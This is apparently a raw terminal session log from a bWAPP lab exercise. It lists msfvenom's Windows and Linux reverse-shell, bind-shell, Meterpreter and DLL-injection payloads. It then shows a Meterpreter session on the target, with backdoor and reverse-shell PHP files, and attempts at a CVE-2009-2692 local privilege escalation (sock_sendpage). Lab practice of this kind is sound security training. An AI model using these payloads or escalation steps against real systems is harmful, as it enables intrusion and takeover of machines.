+    windows/patchupdllinject/bind_hidden_ipknock_tcp    Inject a custom DLL into the exploited process. Listen for a connection. First, the port will need to be knocked from the IP defined in KHOST. This IP will work as an authentication method (you can spoof it with tools like hping). After that you could get your shellcode from any IP. The socket will appear as "closed," thus helping to hide the shellcode
+    windows/patchupdllinject/bind_hidden_tcp            Inject a custom DLL into the exploited process. Listen for a connection from a hidden port and spawn a command shell to the allowed host.
+    windows/patchupdllinject/bind_ipv6_tcp              Inject a custom DLL into the exploited process. Listen for an IPv6 connection (Windows x86)
+    windows/patchupdllinject/bind_ipv6_tcp_uuid         Inject a custom DLL into the exploited process. Listen for an IPv6 connection with UUID Support (Windows x86)
+    windows/patchupdllinject/bind_named_pipe            Inject a custom DLL into the exploited process. Listen for a pipe connection (Windows x86)
+    windows/patchupdllinject/bind_nonx_tcp              Inject a custom DLL into the exploited process. Listen for a connection (No NX)
+    windows/patchupdllinject/bind_tcp                   Inject a custom DLL into the exploited process. Listen for a connection (Windows x86)
+    windows/patchupdllinject/bind_tcp_rc4               Inject a custom DLL into the exploited process. Listen for a connection
+    windows/patchupdllinject/bind_tcp_uuid              Inject a custom DLL into the exploited process. Listen for a connection with UUID Support (Windows x86)
+    windows/patchupdllinject/find_tag                   Inject a custom DLL into the exploited process. Use an established connection
+    windows/patchupdllinject/reverse_ipv6_tcp           Inject a custom DLL into the exploited process. Connect back to the attacker over IPv6
+    windows/patchupdllinject/reverse_nonx_tcp           Inject a custom DLL into the exploited process. Connect back to the attacker (No NX)
+    windows/patchupdllinject/reverse_ord_tcp            Inject a custom DLL into the exploited process. Connect back to the attacker
+    windows/patchupdllinject/reverse_tcp                Inject a custom DLL into the exploited process. Connect back to the attacker
+    windows/patchupdllinject/reverse_tcp_allports       Inject a custom DLL into the exploited process. Try to connect back to the attacker, on all possible ports (1-65535, slowly)
+    windows/patchupdllinject/reverse_tcp_dns            Inject a custom DLL into the exploited process. Connect back to the attacker
+    windows/patchupdllinject/reverse_tcp_rc4            Inject a custom DLL into the exploited process. Connect back to the attacker
+    windows/patchupdllinject/reverse_tcp_rc4_dns        Inject a custom DLL into the exploited process. Connect back to the attacker
+    windows/patchupdllinject/reverse_tcp_uuid           Inject a custom DLL into the exploited process. Connect back to the attacker with UUID Support
+    windows/patchupmeterpreter/bind_hidden_ipknock_tcp  Inject the meterpreter server DLL (staged). Listen for a connection. First, the port will need to be knocked from the IP defined in KHOST. This IP will work as an authentication method (you can spoof it with tools like hping). After that you could get your shellcode from any IP. The socket will appear as "closed," thus helping to hide the shellcode
+    windows/patchupmeterpreter/bind_hidden_tcp          Inject the meterpreter server DLL (staged). Listen for a connection from a hidden port and spawn a command shell to the allowed host.
+    windows/patchupmeterpreter/bind_ipv6_tcp            Inject the meterpreter server DLL (staged). Listen for an IPv6 connection (Windows x86)
+    windows/patchupmeterpreter/bind_ipv6_tcp_uuid       Inject the meterpreter server DLL (staged). Listen for an IPv6 connection with UUID Support (Windows x86)
+    windows/patchupmeterpreter/bind_named_pipe          Inject the meterpreter server DLL (staged). Listen for a pipe connection (Windows x86)
+    windows/patchupmeterpreter/bind_nonx_tcp            Inject the meterpreter server DLL (staged). Listen for a connection (No NX)
+    windows/patchupmeterpreter/bind_tcp                 Inject the meterpreter server DLL (staged). Listen for a connection (Windows x86)
+    windows/patchupmeterpreter/bind_tcp_rc4             Inject the meterpreter server DLL (staged). Listen for a connection
+    windows/patchupmeterpreter/bind_tcp_uuid            Inject the meterpreter server DLL (staged). Listen for a connection with UUID Support (Windows x86)
+    windows/patchupmeterpreter/find_tag                 Inject the meterpreter server DLL (staged). Use an established connection
+    windows/patchupmeterpreter/reverse_ipv6_tcp         Inject the meterpreter server DLL (staged). Connect back to the attacker over IPv6
+    windows/patchupmeterpreter/reverse_nonx_tcp         Inject the meterpreter server DLL (staged). Connect back to the attacker (No NX)
+    windows/patchupmeterpreter/reverse_ord_tcp          Inject the meterpreter server DLL (staged). Connect back to the attacker
+    windows/patchupmeterpreter/reverse_tcp              Inject the meterpreter server DLL (staged). Connect back to the attacker
+    windows/patchupmeterpreter/reverse_tcp_allports     Inject the meterpreter server DLL (staged). Try to connect back to the attacker, on all possible ports (1-65535, slowly)
+    windows/patchupmeterpreter/reverse_tcp_dns          Inject the meterpreter server DLL (staged). Connect back to the attacker
+    windows/patchupmeterpreter/reverse_tcp_rc4          Inject the meterpreter server DLL (staged). Connect back to the attacker
+    windows/patchupmeterpreter/reverse_tcp_rc4_dns      Inject the meterpreter server DLL (staged). Connect back to the attacker
+    windows/patchupmeterpreter/reverse_tcp_uuid         Inject the meterpreter server DLL (staged). Connect back to the attacker with UUID Support
+    windows/pingback_bind_tcp                           Open a socket and report UUID when a connection is received (Windows x86)
+    windows/pingback_reverse_tcp                        Connect back to attacker and report UUID (Windows x86)
+    windows/powershell_bind_tcp                         Listen for a connection and spawn an interactive powershell session
+    windows/powershell_reverse_tcp                      Listen for a connection and spawn an interactive powershell session
+    windows/shell/bind_hidden_ipknock_tcp               Spawn a piped command shell (staged). Listen for a connection. First, the port will need to be knocked from the IP defined in KHOST. This IP will work as an authentication method (you can spoof it with tools like hping). After that you could get your shellcode from any IP. The socket will appear as "closed," thus helping to hide the shellcode
+    windows/shell/bind_hidden_tcp                       Spawn a piped command shell (staged). Listen for a connection from a hidden port and spawn a command shell to the allowed host.
+    windows/shell/bind_ipv6_tcp                         Spawn a piped command shell (staged). Listen for an IPv6 connection (Windows x86)
+    windows/shell/bind_ipv6_tcp_uuid                    Spawn a piped command shell (staged). Listen for an IPv6 connection with UUID Support (Windows x86)
+    windows/shell/bind_named_pipe                       Spawn a piped command shell (staged). Listen for a pipe connection (Windows x86)
+    windows/shell/bind_nonx_tcp                         Spawn a piped command shell (staged). Listen for a connection (No NX)
+    windows/shell/bind_tcp                              Spawn a piped command shell (staged). Listen for a connection (Windows x86)
+    windows/shell/bind_tcp_rc4                          Spawn a piped command shell (staged). Listen for a connection
+    windows/shell/bind_tcp_uuid                         Spawn a piped command shell (staged). Listen for a connection with UUID Support (Windows x86)
+    windows/shell/find_tag                              Spawn a piped command shell (staged). Use an established connection
+    windows/shell/reverse_ipv6_tcp                      Spawn a piped command shell (staged). Connect back to the attacker over IPv6
+    windows/shell/reverse_nonx_tcp                      Spawn a piped command shell (staged). Connect back to the attacker (No NX)
+    windows/shell/reverse_ord_tcp                       Spawn a piped command shell (staged). Connect back to the attacker
+    windows/shell/reverse_tcp                           Spawn a piped command shell (staged). Connect back to the attacker
+    windows/shell/reverse_tcp_allports                  Spawn a piped command shell (staged). Try to connect back to the attacker, on all possible ports (1-65535, slowly)
+    windows/shell/reverse_tcp_dns                       Spawn a piped command shell (staged). Connect back to the attacker
+    windows/shell/reverse_tcp_rc4                       Spawn a piped command shell (staged). Connect back to the attacker
+    windows/shell/reverse_tcp_rc4_dns                   Spawn a piped command shell (staged). Connect back to the attacker
+    windows/shell/reverse_tcp_uuid                      Spawn a piped command shell (staged). Connect back to the attacker with UUID Support
+    windows/shell/reverse_udp                           Spawn a piped command shell (staged). Connect back to the attacker with UUID Support
+    windows/shell_bind_tcp                              Listen for a connection and spawn a command shell
+    windows/shell_bind_tcp_xpfw                         Disable the Windows ICF, then listen for a connection and spawn a command shell
+    windows/shell_hidden_bind_tcp                       Listen for a connection from certain IP and spawn a command shell. The shellcode will reply with a RST packet if the connections is not coming from the IP defined in AHOST. This way the port will appear as "closed" helping us to hide the shellcode.
+    windows/shell_reverse_tcp                           Connect back to attacker and spawn a command shell
+    windows/speak_pwned                                 Causes the target to say "You Got Pwned" via the Windows Speech API
+    windows/upexec/bind_hidden_ipknock_tcp              Uploads an executable and runs it (staged). Listen for a connection. First, the port will need to be knocked from the IP defined in KHOST. This IP will work as an authentication method (you can spoof it with tools like hping). After that you could get your shellcode from any IP. The socket will appear as "closed," thus helping to hide the shellcode
+    windows/upexec/bind_hidden_tcp                      Uploads an executable and runs it (staged). Listen for a connection from a hidden port and spawn a command shell to the allowed host.
+    windows/upexec/bind_ipv6_tcp                        Uploads an executable and runs it (staged). Listen for an IPv6 connection (Windows x86)
+    windows/upexec/bind_ipv6_tcp_uuid                   Uploads an executable and runs it (staged). Listen for an IPv6 connection with UUID Support (Windows x86)
+    windows/upexec/bind_named_pipe                      Uploads an executable and runs it (staged). Listen for a pipe connection (Windows x86)
+    windows/upexec/bind_nonx_tcp                        Uploads an executable and runs it (staged). Listen for a connection (No NX)
+    windows/upexec/bind_tcp                             Uploads an executable and runs it (staged). Listen for a connection (Windows x86)
+    windows/upexec/bind_tcp_rc4                         Uploads an executable and runs it (staged). Listen for a connection
+    windows/upexec/bind_tcp_uuid                        Uploads an executable and runs it (staged). Listen for a connection with UUID Support (Windows x86)
+    windows/upexec/find_tag                             Uploads an executable and runs it (staged). Use an established connection
+    windows/upexec/reverse_ipv6_tcp                     Uploads an executable and runs it (staged). Connect back to the attacker over IPv6
+    windows/upexec/reverse_nonx_tcp                     Uploads an executable and runs it (staged). Connect back to the attacker (No NX)
+    windows/upexec/reverse_ord_tcp                      Uploads an executable and runs it (staged). Connect back to the attacker
+    windows/upexec/reverse_tcp                          Uploads an executable and runs it (staged). Connect back to the attacker
+    windows/upexec/reverse_tcp_allports                 Uploads an executable and runs it (staged). Try to connect back to the attacker, on all possible ports (1-65535, slowly)
+    windows/upexec/reverse_tcp_dns                      Uploads an executable and runs it (staged). Connect back to the attacker
+    windows/upexec/reverse_tcp_rc4                      Uploads an executable and runs it (staged). Connect back to the attacker
+    windows/upexec/reverse_tcp_rc4_dns                  Uploads an executable and runs it (staged). Connect back to the attacker
+    windows/upexec/reverse_tcp_uuid                     Uploads an executable and runs it (staged). Connect back to the attacker with UUID Support
+    windows/upexec/reverse_udp                          Uploads an executable and runs it (staged). Connect back to the attacker with UUID Support
+    windows/vncinject/bind_hidden_ipknock_tcp           Inject a VNC Dll via a reflective loader (staged). Listen for a connection. First, the port will need to be knocked from the IP defined in KHOST. This IP will work as an authentication method (you can spoof it with tools like hping). After that you could get your shellcode from any IP. The socket will appear as "closed," thus helping to hide the shellcode
+    windows/vncinject/bind_hidden_tcp                   Inject a VNC Dll via a reflective loader (staged). Listen for a connection from a hidden port and spawn a command shell to the allowed host.
+    windows/vncinject/bind_ipv6_tcp                     Inject a VNC Dll via a reflective loader (staged). Listen for an IPv6 connection (Windows x86)
+    windows/vncinject/bind_ipv6_tcp_uuid                Inject a VNC Dll via a reflective loader (staged). Listen for an IPv6 connection with UUID Support (Windows x86)
+    windows/vncinject/bind_named_pipe                   Inject a VNC Dll via a reflective loader (staged). Listen for a pipe connection (Windows x86)
+    windows/vncinject/bind_nonx_tcp                     Inject a VNC Dll via a reflective loader (staged). Listen for a connection (No NX)
+    windows/vncinject/bind_tcp                          Inject a VNC Dll via a reflective loader (staged). Listen for a connection (Windows x86)
+    windows/vncinject/bind_tcp_rc4                      Inject a VNC Dll via a reflective loader (staged). Listen for a connection
+    windows/vncinject/bind_tcp_uuid                     Inject a VNC Dll via a reflective loader (staged). Listen for a connection with UUID Support (Windows x86)
+    windows/vncinject/find_tag                          Inject a VNC Dll via a reflective loader (staged). Use an established connection
+    windows/vncinject/reverse_hop_http                  Inject a VNC Dll via a reflective loader (staged). Tunnel communication over an HTTP or HTTPS hop point. Note that you must first upload data/hop/hop.php to the PHP server you wish to use as a hop.
+    windows/vncinject/reverse_http                      Inject a VNC Dll via a reflective loader (staged). Tunnel communication over HTTP (Windows wininet)
+    windows/vncinject/reverse_http_proxy_pstore         Inject a VNC Dll via a reflective loader (staged). Tunnel communication over HTTP
+    windows/vncinject/reverse_ipv6_tcp                  Inject a VNC Dll via a reflective loader (staged). Connect back to the attacker over IPv6
+    windows/vncinject/reverse_nonx_tcp                  Inject a VNC Dll via a reflective loader (staged). Connect back to the attacker (No NX)
+    windows/vncinject/reverse_ord_tcp                   Inject a VNC Dll via a reflective loader (staged). Connect back to the attacker
+    windows/vncinject/reverse_tcp                       Inject a VNC Dll via a reflective loader (staged). Connect back to the attacker
+    windows/vncinject/reverse_tcp_allports              Inject a VNC Dll via a reflective loader (staged). Try to connect back to the attacker, on all possible ports (1-65535, slowly)
+    windows/vncinject/reverse_tcp_dns                   Inject a VNC Dll via a reflective loader (staged). Connect back to the attacker
+    windows/vncinject/reverse_tcp_rc4                   Inject a VNC Dll via a reflective loader (staged). Connect back to the attacker
+    windows/vncinject/reverse_tcp_rc4_dns               Inject a VNC Dll via a reflective loader (staged). Connect back to the attacker
+    windows/vncinject/reverse_tcp_uuid                  Inject a VNC Dll via a reflective loader (staged). Connect back to the attacker with UUID Support
+    windows/vncinject/reverse_winhttp                   Inject a VNC Dll via a reflective loader (staged). Tunnel communication over HTTP (Windows winhttp)
+    windows/x64/encrypted_shell/reverse_tcp             Spawn a piped command shell (staged). Connect to MSF and read in stage
+    windows/x64/encrypted_shell_reverse_tcp             Connect back to attacker and spawn an encrypted command shell
+    windows/x64/exec                                    Execute an arbitrary command (Windows x64)
+    windows/x64/loadlibrary                             Load an arbitrary x64 library path
+    windows/x64/messagebox                              Spawn a dialog via MessageBox using a customizable title, text & icon
+    windows/x64/meterpreter/bind_ipv6_tcp               Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged x64). Listen for an IPv6 connection (Windows x64)
+    windows/x64/meterpreter/bind_ipv6_tcp_uuid          Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged x64). Listen for an IPv6 connection with UUID Support (Windows x64)
+    windows/x64/meterpreter/bind_named_pipe             Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged x64). Listen for a pipe connection (Windows x64)
+    windows/x64/meterpreter/bind_tcp                    Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged x64). Listen for a connection (Windows x64)
+    windows/x64/meterpreter/bind_tcp_rc4                Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged x64). Connect back to the attacker
+    windows/x64/meterpreter/bind_tcp_uuid               Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged x64). Listen for a connection with UUID Support (Windows x64)
+    windows/x64/meterpreter/reverse_http                Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged x64). Tunnel communication over HTTP (Windows x64 wininet)
+    windows/x64/meterpreter/reverse_https               Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged x64). Tunnel communication over HTTP (Windows x64 wininet)
+    windows/x64/meterpreter/reverse_named_pipe          Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged x64). Connect back to the attacker via a named pipe pivot
+    windows/x64/meterpreter/reverse_tcp                 Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged x64). Connect back to the attacker (Windows x64)
+    windows/x64/meterpreter/reverse_tcp_rc4             Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged x64). Connect back to the attacker
+    windows/x64/meterpreter/reverse_tcp_uuid            Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged x64). Connect back to the attacker with UUID Support (Windows x64)
+    windows/x64/meterpreter/reverse_winhttp             Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged x64). Tunnel communication over HTTP (Windows x64 winhttp)
+    windows/x64/meterpreter/reverse_winhttps            Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged x64). Tunnel communication over HTTPS (Windows x64 winhttp)
+    windows/x64/meterpreter_bind_named_pipe             Connect to victim and spawn a Meterpreter shell
+    windows/x64/meterpreter_bind_tcp                    Connect to victim and spawn a Meterpreter shell
+    windows/x64/meterpreter_reverse_http                Connect back to attacker and spawn a Meterpreter shell
+    windows/x64/meterpreter_reverse_https               Connect back to attacker and spawn a Meterpreter shell
+    windows/x64/meterpreter_reverse_ipv6_tcp            Connect back to attacker and spawn a Meterpreter shell
+    windows/x64/meterpreter_reverse_tcp                 Connect back to attacker and spawn a Meterpreter shell
+    windows/x64/pingback_reverse_tcp                    Connect back to attacker and report UUID (Windows x64)
+    windows/x64/powershell_bind_tcp                     Listen for a connection and spawn an interactive powershell session
+    windows/x64/powershell_reverse_tcp                  Listen for a connection and spawn an interactive powershell session
+    windows/x64/shell/bind_ipv6_tcp                     Spawn a piped command shell (Windows x64) (staged). Listen for an IPv6 connection (Windows x64)
+    windows/x64/shell/bind_ipv6_tcp_uuid                Spawn a piped command shell (Windows x64) (staged). Listen for an IPv6 connection with UUID Support (Windows x64)
+    windows/x64/shell/bind_named_pipe                   Spawn a piped command shell (Windows x64) (staged). Listen for a pipe connection (Windows x64)
+    windows/x64/shell/bind_tcp                          Spawn a piped command shell (Windows x64) (staged). Listen for a connection (Windows x64)
+    windows/x64/shell/bind_tcp_rc4                      Spawn a piped command shell (Windows x64) (staged). Connect back to the attacker
+    windows/x64/shell/bind_tcp_uuid                     Spawn a piped command shell (Windows x64) (staged). Listen for a connection with UUID Support (Windows x64)
+    windows/x64/shell/reverse_tcp                       Spawn a piped command shell (Windows x64) (staged). Connect back to the attacker (Windows x64)
+    windows/x64/shell/reverse_tcp_rc4                   Spawn a piped command shell (Windows x64) (staged). Connect back to the attacker
+    windows/x64/shell/reverse_tcp_uuid                  Spawn a piped command shell (Windows x64) (staged). Connect back to the attacker with UUID Support (Windows x64)
+    windows/x64/shell_bind_tcp                          Listen for a connection and spawn a command shell (Windows x64)
+    windows/x64/shell_reverse_tcp                       Connect back to attacker and spawn a command shell (Windows x64)
+    windows/x64/vncinject/bind_ipv6_tcp                 Inject a VNC Dll via a reflective loader (Windows x64) (staged). Listen for an IPv6 connection (Windows x64)
+    windows/x64/vncinject/bind_ipv6_tcp_uuid            Inject a VNC Dll via a reflective loader (Windows x64) (staged). Listen for an IPv6 connection with UUID Support (Windows x64)
+    windows/x64/vncinject/bind_named_pipe               Inject a VNC Dll via a reflective loader (Windows x64) (staged). Listen for a pipe connection (Windows x64)
+    windows/x64/vncinject/bind_tcp                      Inject a VNC Dll via a reflective loader (Windows x64) (staged). Listen for a connection (Windows x64)
+    windows/x64/vncinject/bind_tcp_rc4                  Inject a VNC Dll via a reflective loader (Windows x64) (staged). Connect back to the attacker
+    windows/x64/vncinject/bind_tcp_uuid                 Inject a VNC Dll via a reflective loader (Windows x64) (staged). Listen for a connection with UUID Support (Windows x64)
+    windows/x64/vncinject/reverse_http                  Inject a VNC Dll via a reflective loader (Windows x64) (staged). Tunnel communication over HTTP (Windows x64 wininet)
+    windows/x64/vncinject/reverse_https                 Inject a VNC Dll via a reflective loader (Windows x64) (staged). Tunnel communication over HTTP (Windows x64 wininet)
+    windows/x64/vncinject/reverse_tcp                   Inject a VNC Dll via a reflective loader (Windows x64) (staged). Connect back to the attacker (Windows x64)
+    windows/x64/vncinject/reverse_tcp_rc4               Inject a VNC Dll via a reflective loader (Windows x64) (staged). Connect back to the attacker
+    windows/x64/vncinject/reverse_tcp_uuid              Inject a VNC Dll via a reflective loader (Windows x64) (staged). Connect back to the attacker with UUID Support (Windows x64)
+    windows/x64/vncinject/reverse_winhttp               Inject a VNC Dll via a reflective loader (Windows x64) (staged). Tunnel communication over HTTP (Windows x64 winhttp)
+    windows/x64/vncinject/reverse_winhttps              Inject a VNC Dll via a reflective loader (Windows x64) (staged). Tunnel communication over HTTPS (Windows x64 winhttp)
+
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-sendpage[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-sendpage[00m] $ msfvenom --list payloads  | grep [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-sendpage[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-sendpage[00m] $ msfvenom --list payloads  | grep lix[Knx[Kus[Kx | greo[Kp reverce[K[Kse
+    linux/aarch64/meterpreter/reverse_tcp               Inject the mettle server payload (staged). Connect back to the attacker
+    linux/aarch64/meterpreter_reverse_http              Run the Meterpreter / Mettle server payload (stageless)
+    linux/aarch64/meterpreter_reverse_https             Run the Meterpreter / Mettle server payload (stageless)
+    linux/aarch64/meterpreter_reverse_tcp               Run the Meterpreter / Mettle server payload (stageless)
+    linux/aarch64/shell/reverse_tcp                     dup2 socket in x12, then execve. Connect back to the attacker
+    linux/aarch64/shell_reverse_tcp                     Connect back to attacker and spawn a command shell
+    linux/armbe/meterpreter_reverse_http                Run the Meterpreter / Mettle server payload (stageless)
+    linux/armbe/meterpreter_reverse_https               Run the Meterpreter / Mettle server payload (stageless)
+    linux/armbe/meterpreter_reverse_tcp                 Run the Meterpreter / Mettle server payload (stageless)
+    linux/armle/meterpreter/reverse_tcp                 Inject the mettle server payload (staged). Connect back to the attacker
+    linux/armle/meterpreter_reverse_http                Run the Meterpreter / Mettle server payload (stageless)
+    linux/armle/meterpreter_reverse_https               Run the Meterpreter / Mettle server payload (stageless)
+    linux/armle/meterpreter_reverse_tcp                 Run the Meterpreter / Mettle server payload (stageless)
+    linux/armle/shell/reverse_tcp                       dup2 socket in r12, then execve. Connect back to the attacker
+    linux/armle/shell_reverse_tcp                       Connect back to attacker and spawn a command shell
+    linux/mips64/meterpreter_reverse_http               Run the Meterpreter / Mettle server payload (stageless)
+    linux/mips64/meterpreter_reverse_https              Run the Meterpreter / Mettle server payload (stageless)
+    linux/mips64/meterpreter_reverse_tcp                Run the Meterpreter / Mettle server payload (stageless)
+    linux/mipsbe/meterpreter/reverse_tcp                Inject the mettle server payload (staged). Connect back to the attacker
+    linux/mipsbe/meterpreter_reverse_http               Run the Meterpreter / Mettle server payload (stageless)
+    linux/mipsbe/meterpreter_reverse_https              Run the Meterpreter / Mettle server payload (stageless)
+    linux/mipsbe/meterpreter_reverse_tcp                Run the Meterpreter / Mettle server payload (stageless)
+    linux/mipsbe/shell/reverse_tcp                      Spawn a command shell (staged). Connect back to the attacker
+    linux/mipsbe/shell_reverse_tcp                      Connect back to attacker and spawn a command shell
+    linux/mipsle/meterpreter/reverse_tcp                Inject the mettle server payload (staged). Connect back to the attacker
+    linux/mipsle/meterpreter_reverse_http               Run the Meterpreter / Mettle server payload (stageless)
+    linux/mipsle/meterpreter_reverse_https              Run the Meterpreter / Mettle server payload (stageless)
+    linux/mipsle/meterpreter_reverse_tcp                Run the Meterpreter / Mettle server payload (stageless)
+    linux/mipsle/shell/reverse_tcp                      Spawn a command shell (staged). Connect back to the attacker
+    linux/mipsle/shell_reverse_tcp                      Connect back to attacker and spawn a command shell
+    linux/ppc/meterpreter_reverse_http                  Run the Meterpreter / Mettle server payload (stageless)
+    linux/ppc/meterpreter_reverse_https                 Run the Meterpreter / Mettle server payload (stageless)
+    linux/ppc/meterpreter_reverse_tcp                   Run the Meterpreter / Mettle server payload (stageless)
+    linux/ppc/shell_reverse_tcp                         Connect back to attacker and spawn a command shell
+    linux/ppc64/shell_reverse_tcp                       Connect back to attacker and spawn a command shell
+    linux/ppc64le/meterpreter_reverse_http              Run the Meterpreter / Mettle server payload (stageless)
+    linux/ppc64le/meterpreter_reverse_https             Run the Meterpreter / Mettle server payload (stageless)
+    linux/ppc64le/meterpreter_reverse_tcp               Run the Meterpreter / Mettle server payload (stageless)
+    linux/ppce500v2/meterpreter_reverse_http            Run the Meterpreter / Mettle server payload (stageless)
+    linux/ppce500v2/meterpreter_reverse_https           Run the Meterpreter / Mettle server payload (stageless)
+    linux/ppce500v2/meterpreter_reverse_tcp             Run the Meterpreter / Mettle server payload (stageless)
+    linux/x64/meterpreter/reverse_tcp                   Inject the mettle server payload (staged). Connect back to the attacker
+    linux/x64/meterpreter_reverse_http                  Run the Meterpreter / Mettle server payload (stageless)
+    linux/x64/meterpreter_reverse_https                 Run the Meterpreter / Mettle server payload (stageless)
+    linux/x64/meterpreter_reverse_tcp                   Run the Meterpreter / Mettle server payload (stageless)
+    linux/x64/pingback_reverse_tcp                      Connect back to attacker and report UUID (Linux x64)
+    linux/x64/shell/reverse_tcp                         Spawn a command shell (staged). Connect back to the attacker
+    linux/x64/shell_reverse_ipv6_tcp                    Connect back to attacker and spawn a command shell over IPv6
+    linux/x64/shell_reverse_tcp                         Connect back to attacker and spawn a command shell
+    linux/x86/meterpreter/reverse_ipv6_tcp              Inject the mettle server payload (staged). Connect back to attacker over IPv6
+    linux/x86/meterpreter/reverse_nonx_tcp              Inject the mettle server payload (staged). Connect back to the attacker
+    linux/x86/meterpreter/reverse_tcp                   Inject the mettle server payload (staged). Connect back to the attacker
+    linux/x86/meterpreter/reverse_tcp_uuid              Inject the mettle server payload (staged). Connect back to the attacker
+    linux/x86/meterpreter_reverse_http                  Run the Meterpreter / Mettle server payload (stageless)
+    linux/x86/meterpreter_reverse_https                 Run the Meterpreter / Mettle server payload (stageless)
+    linux/x86/meterpreter_reverse_tcp                   Run the Meterpreter / Mettle server payload (stageless)
+    linux/x86/metsvc_reverse_tcp                        Stub payload for interacting with a Meterpreter Service
+    linux/x86/shell/reverse_ipv6_tcp                    Spawn a command shell (staged). Connect back to attacker over IPv6
+    linux/x86/shell/reverse_nonx_tcp                    Spawn a command shell (staged). Connect back to the attacker
+    linux/x86/shell/reverse_tcp                         Spawn a command shell (staged). Connect back to the attacker
+    linux/x86/shell/reverse_tcp_uuid                    Spawn a command shell (staged). Connect back to the attacker
+    linux/x86/shell_reverse_tcp                         Connect back to attacker and spawn a command shell
+    linux/x86/shell_reverse_tcp_ipv6                    Connect back to attacker and spawn a command shell over IPv6
+    linux/zarch/meterpreter_reverse_http                Run the Meterpreter / Mettle server payload (stageless)
+    linux/zarch/meterpreter_reverse_https               Run the Meterpreter / Mettle server payload (stageless)
+    linux/zarch/meterpreter_reverse_tcp                 Run the Meterpreter / Mettle server payload (stageless)
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-sendpage[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-sendpage[00m] $ ^C
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-sendpage[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-sendpage[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-sendpage[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-sendpage[00m] $ fg
+msfconsole -q
+^L  
+
+[0m[4mmsf5[0m exploit([1m[31mlinux/local/sock_sendpage[0m) [0m> 
+[0m[4mmsf5[0m exploit([1m[31mlinux/local/sock_sendpage[0m) [0m> [H[2J[4mmsf5[0m exploit([1m[31mlinux/local/sock_sendpage[0m) [0m> sessions -i 1
+[0m[1m[34m[*][0m Starting interaction with 1...
+
+[4mmeterpreter[0m > [H[2J[4mmeterpreter[0m > shell -
+[0mProcess 16494 created.
+Channel 7 created.
+
+pwd
+/var/www/bWAPP/documents
+ls
+Iron_Man.pdf
+Terminator_Salvation.pdf
+The_Amazing_Spider-Man.pdf
+The_Cabin_in_the_Woods.pdf
+The_Dark_Knight_Rises.pdf
+The_Incredible_Hulk.pdf
+bWAPP_intro.pdf
+backdoor.php
+cve-2009-2692
+cve-2009-2692.tar
+msf_http_put_test.txt
+nc_traffic
+payload.php
+payload2.php
+qwerty.php
+reverse_tcp_payload.php
+cd cve-2009-2692
+ls
+cve-2009-2692.sh
+exploit.c
+exploit.so
+pwnkernel
+pwnkernel.c
+pwnkernel2.c
+bash cve-2009-2692.sh
+
+
+
+
+ls
+cve-2009-2692.sh
+exploit.c
+exploit.so
+pwnkernel
+pwnkernel.c
+gs  sh cve-2009-2692.sh
+^L  cd ..
+^L  ls
+Iron_Man.pdf
+Terminator_Salvation.pdf
+The_Amazing_Spider-Man.pdf
+The_Cabin_in_the_Woods.pdf
+The_Dark_Knight_Rises.pdf
+The_Incredible_Hulk.pdf
+bWAPP_intro.pdf
+backdoor.php
+cve-2009-2692
+cve-2009-2692.tar
+msf_http_put_test.txt
+nc_traffic
+payload.php
+payload2.php
+qwerty.php
+reverse_tcp_payload.php
+rmdir cve-2009-2692
+rmdir: failed to remove `cve-2009-2692': Directory not empty
+rm -rf cve-2009-2692
+tar xf cve-2009-2692/ .tzr  ar
+ll
+/bin/sh: ll: not found
+ls
+Iron_Man.pdf
+Terminator_Salvation.pdf
+The_Amazing_Spider-Man.pdf
+The_Cabin_in_the_Woods.pdf
+The_Dark_Knight_Rises.pdf
+The_Incredible_Hulk.pdf
+bWAPP_intro.pdf
+backdoor.php
+cve-2009-2692
+cve-2009-2692.tar
+msf_http_put_test.txt
+nc_traffic
+payload.php
+payload2.php
+qwerty.php
+reverse_tcp_payload.php
+cd cve-2009-2692
+ll s
+cve-2009-2692.sh
+exploit.c
+pwnkernel.c
+sh cve-2009-2692.sh
+ls -l 
+total 44
+-rw-r--r-- 1 www-data www-data  1208 Apr 23  2014 cve-2009-2692.sh
+-rw-r--r-- 1 www-data www-data 11119 May  4  2014 exploit.c
+-rwxr-xr-x 1 www-data www-data 14373 Aug 18 15:27 exploit.so
+-rwxr-xr-x 1 www-data www-data  7443 Aug 18 15:27 pwnkernel
+-rw-r--r-- 1 www-data www-data   764 Apr 23  2014 pwnkernel.c
+./p   ./pwnkernel
+whoami
+www-data
+l^C
+Terminate channel 7? [y/N]  y
+[4mmeterpreter[0m > Interrupt: use the 'exit' command to quit
+[4mmeterpreter[0m > Interrupt: use the 'exit' command to quit
+[4mmeterpreter[0m > [0m[1m[34m[*][0m Shutting down Meterpreter...
+
+[1m[34m[*][0m 10.10.10.6 - Meterpreter session 1 closed.  Reason: User exit
